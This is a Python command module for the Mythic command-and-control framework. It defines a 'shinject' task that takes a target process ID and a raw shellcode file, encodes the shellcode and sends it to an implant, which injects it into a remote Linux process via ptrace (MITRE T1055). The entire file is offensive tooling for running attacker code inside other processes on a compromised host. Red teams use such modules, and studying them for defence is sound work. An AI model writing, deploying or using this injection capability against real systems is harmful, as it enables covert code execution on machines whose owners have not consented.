import base64
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from mythic_container.MythicGoRPC import *


class ShinjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                type=ParameterType.Number,
                description="Target process ID to inject into",
            ),
            CommandParameter(
                name="shellcode",
                type=ParameterType.File,
                description="Raw shellcode file to inject",
            ),
        ]

    async def parse_arguments(self):
        raise ValueError("shinject requires the task UI (pid + shellcode file)")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class ShinjectCommand(CommandBase):
    cmd = "shinject"
    needs_admin = False
    help_cmd = "shinject"
    description = "Inject raw shellcode into a remote process via ptrace (Linux x86_64)"
    version = 1
    author = "@grampae"
    attackmapping = ["T1055"]
    argument_class = ShinjectArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Linux],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        pid = task.args.get_arg("pid")
        file_id = task.args.get_arg("shellcode")

        # Fetch shellcode bytes and base64-encode for the agent
        resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=file_id,
        ))
        if not resp.Success or resp.Content is None:
            raise Exception(f"Failed to fetch shellcode: {resp.Error}")

        sc_b64 = base64.b64encode(resp.Content).decode()
        task.args.remove_arg("shellcode")
        task.args.add_arg("shellcode", sc_b64, ParameterType.String)
        task.display_params = f"pid={pid} shellcode={len(resp.Content)} bytes"
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
